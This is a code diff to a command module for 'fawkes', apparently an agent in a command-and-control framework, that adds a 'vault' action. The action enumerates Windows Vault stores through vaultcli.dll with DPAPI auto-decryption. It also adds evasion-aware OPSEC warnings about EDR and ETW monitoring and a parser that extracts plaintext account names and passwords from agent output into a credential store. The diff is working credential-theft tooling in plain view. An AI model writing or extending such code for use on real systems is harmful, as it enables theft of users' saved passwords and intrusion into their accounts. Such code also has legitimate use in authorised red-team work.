@@ -12,9 +12,9 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "credman",
-		Description:         "Enumerate Windows Credential Manager entries (saved passwords, domain credentials)",
-		HelpString:          "credman [-action <list|dump>] [-filter <pattern>]",
-		Version:             1,
+		Description:         "Enumerate Windows Credential Manager entries (saved passwords, domain credentials, vault items)",
+		HelpString:          "credman [-action <list|dump|vault>] [-filter <pattern>]",
+		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1555.004"},
@@ -29,8 +29,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"list", "dump"},
-				Description:      "list: show credential targets and usernames. dump: also reveal stored passwords.",
+				Choices:          []string{"list", "dump", "vault"},
+				Description:      "list: show credential targets and usernames. dump: also reveal stored passwords. vault: enumerate Windows Vault (web logins, MS account credentials) — DPAPI auto-decrypts in interactive sessions.",
 				DefaultValue:     "list",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -60,11 +60,15 @@ func init() {
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 				action, _ := taskData.Args.GetStringArg("action")
+				msg := fmt.Sprintf("OPSEC WARNING: Credential Manager %s. Accesses Windows Credential Manager via CredEnumerate API to read stored credentials (web logins, RDP creds, network passwords). EDR may monitor Credential Manager access patterns.", action)
+				if action == "vault" {
+					msg = "OPSEC WARNING: Credential Manager vault. Calls vaultcli.dll (VaultEnumerateVaults / VaultOpenVault / VaultGetItem) to enumerate Windows Vault stores (web logins, Microsoft account sign-ins, Passport). VaultGetItem auto-decrypts via DPAPI under the calling user — only works in an interactive logon session. EDRs that hook vaultcli or watch the Microsoft-Windows-VaultSvc ETW provider will surface every call. Each retrieved item also writes to the user's vault audit log."
+				}
 				return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 					TaskID:             taskData.Task.ID,
 					Success:            true,
 					OpsecPreBlocked:    false,
-					OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Credential Manager %s. Accesses Windows Credential Manager via CredEnumerate API to read stored credentials (web logins, RDP creds, network passwords). EDR may monitor Credential Manager access patterns.", action),
+					OpsecPreMessage:    msg,
 					OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 				}
 			},
@@ -94,7 +98,11 @@ func init() {
 			action, _ := taskData.Args.GetStringArg("action")
 			display := fmt.Sprintf("%s", action)
 			response.DisplayParams = &display
-			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("CredEnumerateW credential enumeration — %s", action))
+			if action == "vault" {
+				createArtifact(taskData.Task.ID, "API Call", "vaultcli.dll: VaultEnumerateVaults / VaultOpenVault / VaultEnumerateItems / VaultGetItem")
+			} else {
+				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("CredEnumerateW credential enumeration — %s", action))
+			}
 			return response
 		},
 		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
@@ -106,11 +114,18 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
-			creds := parseCredmanBlocks(responseText)
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			source := "credman"
+			if strings.Contains(responseText, "=== Windows Vault Enumeration") {
+				creds = parseCredmanVaultBlocks(responseText)
+				source = "credman vault"
+			} else {
+				creds = parseCredmanBlocks(responseText)
+			}
 			registerCredentials(processResponse.TaskData.Task.ID, creds)
 			if len(creds) > 0 {
 				logOperationEvent(processResponse.TaskData.Task.ID,
-					fmt.Sprintf("[CREDENTIAL] credman extracted %d credentials from %s", len(creds), processResponse.TaskData.Callback.Host), true)
+					fmt.Sprintf("[CREDENTIAL] %s extracted %d credentials from %s", source, len(creds), processResponse.TaskData.Callback.Host), true)
 			}
 			return response
 		},
@@ -152,6 +167,68 @@ func parseCredmanBlocks(responseText string) []mythicrpc.MythicRPCCredentialCrea
 			})
 		}
 	}
+	return creds
+}
+
+// parseCredmanVaultBlocks parses `credman -action vault` output and extracts
+// credential entries. The agent emits a header followed by `[#N] ...` items
+// inside `--- Vault: <name> {GUID} ---` sections; we walk the lines and pair
+// Identity + Authenticator + Resource per item.
+//
+// Skips items whose authenticator is `[protected, decryption requires
+// interactive user context]` — those are present-but-unreadable in the
+// agent's session.
+func parseCredmanVaultBlocks(responseText string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
+	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+	var (
+		curVaultName, schema, resource, identity, authenticator string
+	)
+	flush := func() {
+		if identity != "" && authenticator != "" && !strings.HasPrefix(authenticator, "[protected") {
+			realm := resource
+			if realm == "" {
+				realm = curVaultName
+			}
+			creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+				CredentialType: "plaintext",
+				Realm:          realm,
+				Account:        identity,
+				Credential:     authenticator,
+				Comment:        fmt.Sprintf("vault %s (%s)", curVaultName, schema),
+			})
+		}
+		schema, resource, identity, authenticator = "", "", "", ""
+	}
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		switch {
+		case strings.HasPrefix(trimmed, "--- Vault:"):
+			flush()
+			// "--- Vault: <name> {GUID} ---"
+			rest := strings.TrimSuffix(strings.TrimPrefix(trimmed, "--- Vault:"), "---")
+			rest = strings.TrimSpace(rest)
+			if idx := strings.LastIndex(rest, "{"); idx > 0 {
+				curVaultName = strings.TrimSpace(rest[:idx])
+			} else {
+				curVaultName = rest
+			}
+		case strings.HasPrefix(trimmed, "[#"):
+			flush()
+			// "[#N] Schema: <name>"
+			if idx := strings.Index(trimmed, "Schema:"); idx >= 0 {
+				schema = strings.TrimSpace(trimmed[idx+len("Schema:"):])
+			}
+		case strings.HasPrefix(trimmed, "Resource:"):
+			resource = strings.TrimSpace(strings.TrimPrefix(trimmed, "Resource:"))
+		case strings.HasPrefix(trimmed, "Identity:"):
+			identity = strings.TrimSpace(strings.TrimPrefix(trimmed, "Identity:"))
+		case strings.HasPrefix(trimmed, "Authenticator:"):
+			authenticator = strings.TrimSpace(strings.TrimPrefix(trimmed, "Authenticator:"))
+		case strings.HasPrefix(trimmed, "Summary:"):
+			flush()
+		}
+	}
+	flush()
 	return creds
 }
 
